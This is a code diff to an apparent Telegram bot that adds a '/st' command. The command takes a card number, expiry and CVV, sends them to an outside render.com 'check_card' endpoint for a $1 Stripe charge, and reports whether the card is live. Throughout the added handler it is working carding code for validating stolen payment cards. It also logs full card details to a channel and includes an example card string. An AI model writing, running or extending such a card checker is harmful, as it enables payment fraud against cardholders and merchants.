@@ -765,7 +765,7 @@ async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
         return f"Error processing card: {str(e)}"
 
 # Add this handler to your script
-@app.on_message(filters.command("st", prefixes="/"))
+@app.on_message(filters.command("stt", prefixes="/"))
 async def stripe_check_handler(client: Client, message: Message):
     try:
         # Check if CC is provided
@@ -1752,6 +1752,116 @@ async def mass_check_handler(client: Client, message: Message):
             await processing_msg.delete()
         if 'filename' in locals() and os.path.exists(filename):
             os.remove(filename)
+
+@app.on_message(filters.command("st", prefixes="/"))
+async def stripe_check_handler(client: Client, message: Message):
+    try:
+        # Check if CC is provided
+        if len(message.text.split()) < 2:
+            await message.reply("❗ Please provide a CC in format: `/st 4147202658688666|02|29|206`")
+            return
+
+        # Extract CC details
+        cc_details = message.text.split()[1]
+        if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", cc_details):
+            await message.reply("❗ Invalid CC format. Use: `/st 4147202658688666|02|29|206`")
+            return
+
+        cc, mnt, yr, cvc = cc_details.split("|")
+        
+        # Send processing message
+        proc_msg = await message.reply("↯ Checking card via Stripe [1$]...")
+
+        start_time = time.time()
+        
+        # Prepare API request
+        url = "https://takeshi-j8i9.onrender.com/check_card"
+        headers = {
+            "Content-Type": "application/json",
+            "Origin": "https://takeshi-j8i9.onrender.com",
+            "Referer": "https://takeshi-j8i9.onrender.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
+        }
+        data = {
+            "card": cc_details,
+            "site_id": None,
+            "gateway": "stripe_charge"
+        }
+
+        try:
+            # Make API request
+            response = requests.post(url, headers=headers, json=data)
+            response_text = response.text.lower()
+            
+            # Get BIN info
+            brand, bank, country = get_bin_info(cc[:6])
+            elapsed = time.time() - start_time
+            
+            # Determine status
+            if "approved" in response_text:
+                status = "APPROVED ✅️"
+                result_msg = "1$ CHARGED ✅️✅️👌"
+            elif "declined" in response_text:
+                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
+                result_msg = "Card was declined"
+            else:
+                status = "UNKNOWN RESPONSE ⚠️"
+                result_msg = response.text[:100]  # Show first 100 chars of response
+
+            # Format result message
+            result_text = (
+                f"┏━━━━━━━⍟\n"
+                f"┃ {status}\n"
+                f"┗━━━━━━━━━━━⊛\n\n"
+                f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"
+                f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe [1$] \n"
+                f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {result_msg}\n\n"
+                f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
+                f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
+                f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
+                f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
+                f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
+                f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
+            )
+            
+            await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)
+            
+            # Log to channel
+            log_text = (
+                f"🔵 Stripe API Check:\n"
+                f"Card: {cc_details}\n"
+                f"Status: {status}\n"
+                f"Response: {result_msg}\n"
+                f"Time: {elapsed:.2f}s"
+            )
+            await log_to_channel(client, "CC", message, cc_details, status)
+
+        except Exception as e:
+            elapsed = time.time() - start_time
+            brand, bank, country = get_bin_info(cc[:6])
+            
+            error_text = (
+                f"┏━━━━━━━⍟\n"
+                f"┃ ERROR ⚠️\n"
+                f"┗━━━━━━━━━━━⊛\n\n"
+                f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"
+                f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe [1$] \n"
+                f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {str(e)}\n\n"
+                f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
+                f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
+                f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
+                f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
+                f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
+                f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
+            )
+            
+            await proc_msg.edit(error_text, parse_mode=ParseMode.HTML)
+            await log_to_channel(client, "CC", message, cc_details, f"Error: {str(e)}")
+
+    except Exception as e:
+        await message.reply(f"❌ Error processing command: {str(e)}")
+        if 'proc_msg' in locals():
+            await proc_msg.delete()
 
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
